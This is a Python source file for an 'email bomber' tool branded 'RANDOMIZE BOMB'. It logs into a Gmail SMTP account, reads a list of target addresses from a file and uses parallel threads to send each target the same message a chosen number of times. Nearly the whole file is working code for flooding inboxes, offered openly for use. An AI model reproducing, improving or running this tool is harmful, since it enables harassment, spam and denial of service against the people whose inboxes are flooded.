from pystyle import Colorate, Colors
import os
import smtplib
import threading
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def logo():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Colorate.Horizontal(Colors.red_to_white, """
     _.-^^---....,,--       
 _--                  --_  
<                        >)
|                         | 
 \._                   _./  
    ```--. . , ; .--'''       
          | |   |           
       .-=||  | |=-.   
       `-=#$%&%$#=-'   
          | ;  :|     
 _____.,-#%&$@%#&#~,._____
                              
----------------------------------------
Type : RANDOMIZE BOMB
Revolt : https://rvlt.gg/wqXBTNNB
Github : https://github.com/madanokr001
----------------------------------------
                """))

def send_email(sender_email, password, recv_email, message, total_messages, subject):
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls() 
        server.login(sender_email, password)  

        msg = MIMEMultipart()  
        msg['From'] = sender_email
        msg['To'] = recv_email
        msg['Subject'] = subject
        msg.attach(MIMEText(message, 'plain'))

        for i in range(int(total_messages)):
            server.sendmail(sender_email, recv_email, msg.as_string())
            print(Colorate.Horizontal(Colors.red_to_white, f"[+] EMAIL - BOMBER : {recv_email} TOTAL : {i+1}/{total_messages}"))

        server.quit()  
        print(Colorate.Horizontal(Colors.red_to_white, "[*] FINISH.."))

    except smtplib.SMTPAuthenticationError:
        print(Colorate.Horizontal(Colors.red_to_white, "[-] Error? click link: https://support.google.com/mail/answer/185833?hl=en"))

def send_emails_from_file(sender_email, password, file_path, message, total_messages, subject):
    with open(file_path, 'r') as file:
        email_list = file.readlines()

    for recv_email in email_list:
        recv_email = recv_email.strip() 
        send_email(sender_email, password, recv_email, message, total_messages, subject)

def send_emails_thread(sender_email, password, file_path, message, total_messages, subject):
    threads = []
    with open(file_path, 'r') as file:
        email_list = file.readlines()

    for recv_email in email_list:
        recv_email = recv_email.strip() 
        thread = threading.Thread(target=send_email, args=(sender_email, password, recv_email, message, total_messages, subject))  
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

def email_random_main():
    logo()
    sender_email = input(Colorate.Horizontal(Colors.red_to_white, """
╔═══[root@SENDER-EMAIL]
║
║═══> 
"""))
    password = input(Colorate.Horizontal(Colors.red_to_white, """
╔═══[root@APP-PASSWORD]
║
║═══> 
"""))

    subject = input(Colorate.Horizontal(Colors.red_to_white, """
╔═══[root@SUBJECT]
║
║═══> 
"""))
    message = input(Colorate.Horizontal(Colors.red_to_white, """
╔═══[root@MESSAGE]
║
║═══> 
"""))
    
    file_path = input(Colorate.Horizontal(Colors.red_to_white, """
╔═══[root@EMAIL-LIST.txt]
║
║═══> 
"""))
    
    total_messages = input(Colorate.Horizontal(Colors.red_to_white, """
╔═══[root@TOTAL-MESSAGE]
║
║═══> 
"""))

    send_emails_thread(sender_email, password, file_path, message, total_messages, subject)